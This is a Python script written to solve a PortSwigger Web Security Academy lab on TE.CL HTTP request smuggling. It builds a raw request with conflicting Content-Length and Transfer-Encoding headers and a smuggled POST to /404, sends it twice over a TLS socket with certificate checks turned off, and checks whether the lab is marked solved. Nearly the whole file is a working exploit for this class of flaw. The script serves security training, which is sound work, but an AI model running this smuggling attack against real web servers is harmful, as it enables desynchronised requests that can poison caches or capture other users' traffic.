# HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

# https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import socket
import ssl
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def build_request(url):
	request_body = """5e\r\n"""

	request_content = 'POST / HTTP/1.1\r\n'
	request_content += 'Host: ' + url + '\r\n'
	request_content += 'Content-Type: application/x-www-form-urlencoded\r\n'
	request_content += 'Content-Length: ' + str(len(request_body)) + '\r\n'
	request_content += 'Transfer-Encoding: chunked\r\n'
	request_content += '\r\n'
	request_content += request_body
	request_content += 'POST /404 HTTP/1.1\r\n'
	request_content += 'Content-Type: application/x-www-form-urlencoded\r\n'
	request_content += 'Content-Length: 15\r\n'
	request_content += '\r\n'
	request_content += 'x=1\r\n'
	request_content += '0\r\n'
	request_content += '\r\n'
	print("------------------------------------------------------")
	print(request_content)
	print("------------------------------------------------------")
	return request_content

def send_smuggling(request_content, host, port):
	context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
	context.check_hostname = False
	context.verify_mode = ssl.CERT_NONE
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock = context.wrap_socket(sock, server_hostname=host)
	sock.connect((host, port))
	sock.sendall(request_content.encode())
	print(sock)
	peer = sock.getpeername()
	sock.close()
	return peer

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses')
	parser = argparse.ArgumentParser(description="[+] Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	if parsed_url.port:
		port = parsed_url.port
	elif parsed_url.scheme == "https":
		port = 443
	elif parsed_url.scheme == "http":
		port = 80
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			time.sleep(1)
			request_content = build_request(host)
			print('\n[+] Trying send HTTP Request Smuggling attack...\n')
			print('[+] Sending the request once !')
			raddr1 = send_smuggling(request_content, host, port)
			time.sleep(2)
			print('[+] Sending the request twice !')
			raddr2 = send_smuggling(request_content, host, port)
			r = s.post(url)
			print(r)
			if r.status_code == 200 and raddr1 != raddr2:
				print('[+] The lab should be solved !')
				time.sleep(5)
				s.cookies.clear()
				s.headers.clear()
				r = s.get(url)
				if 'Congratulations, you solved the lab!' in r.text:
					print('[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
